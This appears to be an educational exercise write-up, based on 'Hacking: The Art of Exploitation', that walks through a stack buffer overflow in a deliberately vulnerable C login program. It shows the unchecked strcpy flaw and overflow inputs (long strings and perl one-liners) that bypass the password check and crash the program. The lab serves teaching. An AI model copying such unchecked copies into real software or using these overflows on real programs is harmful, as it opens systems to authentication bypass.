# Authentication Buffer Overflow Exercise

## Reference
This exercise is based on examples and methodology presented in the book  
**_Hacking: The Art of Exploitation_ by Jon Erickson**, which was used as a reference book for this course.

The goal of this exercise is to understand how a **stack-based buffer overflow** can alter program behavior and bypass authentication logic.

---

## Vulnerable Program: `auth_overflow.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
   int auth_flag = 0;
   char password_buffer[16];

   strcpy(password_buffer, password);

   if(strcmp(password_buffer, "brillig") == 0)
      auth_flag = 1;
   if(strcmp(password_buffer, "outgrabe") == 0)
      auth_flag = 1;

   return auth_flag;
}

int main(int argc, char *argv[]) {
   if(argc < 2) {
      printf("Usage: %s <password>\n", argv[0]);
      exit(0);
   }
   if(check_authentication(argv[1])) {
      printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
      printf("      Access Granted.\n");
      printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
   } else {
      printf("\nAccess Denied.\n");
   }
}
```

## The program logic:

$ gcc -g -o auth_overflow auth_overflow.c

$ ./auth_overflow test
Access Denied.

$ ./auth_overflow brillig
Access Granted.

$ ./auth_overflow outgrabe
Access Granted.

## Vulnerability 

The vulnerability is a stack-based buffer overflow caused by the following line:
```c
strcpy(password_buffer, password);
```
The password_buffer is only 16 bytes, but strcpy does not perfom boundry check. Inputs longer than 16 bytes will overflow the buffer. 

We can use this exploit to change the value of the **auth_flag**, which is stored above the password_buffer in the stack. 

## Exploitation

When an overly long input is supplied, authentication is bypassed:
$ ./auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Access Granted.

$ ./auth_overflow $(perl -e 'print "A"x30')

In this case, 30 bytes are sufficient to overflow the 16-byte buffer and overwrite auth_flag, while leaving the rest of the stack frame intact. The program prints "Access Granted" and exits normally.

Using a slightly longer input demonstrates the effect of overwriting additional stack data:
$ ./auth_overflow $(perl -e 'print "A"x32')
Access Granted.
Segmentation fault

With 32 bytes, not only is auth_flag overwritten, but additional stack metadata such as the saved frame pointer or return address is corrupted. As a result, the program still grants access but later crashes due to invalid control data on the stack.

